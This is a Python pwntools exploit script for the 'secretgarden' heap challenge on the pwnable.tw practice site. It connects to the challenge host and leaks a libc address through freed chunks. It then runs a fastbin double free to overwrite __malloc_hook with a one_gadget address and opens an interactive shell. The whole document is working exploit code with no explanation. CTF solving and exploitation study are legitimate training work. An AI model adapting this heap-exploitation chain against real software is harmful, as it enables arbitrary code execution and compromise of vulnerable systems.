#!/usr/bin/python3
from pwn import *

PATH = "secretgarden"
LIBC = "libc_64.so.6"
HOST = "chall.pwnable.tw"
PORT = "10203"
SSL = False

patched = PATH + "_patched"
exe = context.binary = ELF(PATH, checksec=False)
libc = ELF(LIBC, checksec=False) if LIBC else None 
context.terminal = ['tmux', 'splitw', '-h', '-p', '55']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sn = lambda num=0: sleep(0.1) or p.sendline(str(num).encode())
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=SSL)
    elif os.path.exists(patched): 
        return process(patched)
    else:
        return process(PATH)

def GDB():
    if args.GDB:
        gdb.attach(p, gdbscript=gs)


def _menu(choice):
    sna(b"choice : ", choice)


def _raise(length, name, color):
    _menu(1)
    sna(b"name :", length)
    sa(b"flower :", name)
    sla(b"flower :", color)

def _visit():
    _menu(2)

def _remove(index):
    _menu(3)
    sna(b"garden:", index)

def _clean():
    _menu(4)

def _leave():
    _menu(5)


gs = '''
#    b*$_base()+0x000000000000107B
    b*execve
    c
'''

p = conn()
GDB()


_raise(0x420, b"name0", b"color0")
_raise(0x28, b"name1", b"color1")
_remove(0)
_remove(1)
_raise(0x420, b"name2", b"color2")
_remove(0)
_visit()

p.recvuntil(b"Name of the flower[2] :")
libc.address = u64(p.recv(6)+b'\0\0') - 0x3c3b78
log.warn(hex(libc.address))
_raise(0x420-0x30, b"name3", b"color3")

_raise(0x60, b"name4", b"color4")
_raise(0x60, b"name5", b"color5")
_remove(4)
_remove(5)
_remove(4)

_raise(0x60, p64(libc.sym.__malloc_hook-0x23), b"color6")
_raise(0x60, b"name7", b"color7")
_raise(0x60, b"name8", b"color8")
_raise(0x60, b'A'*3 + p64(libc.address+0xef6c4)*3, b"color9")

_remove(3)
_remove(3)


p.interactive()
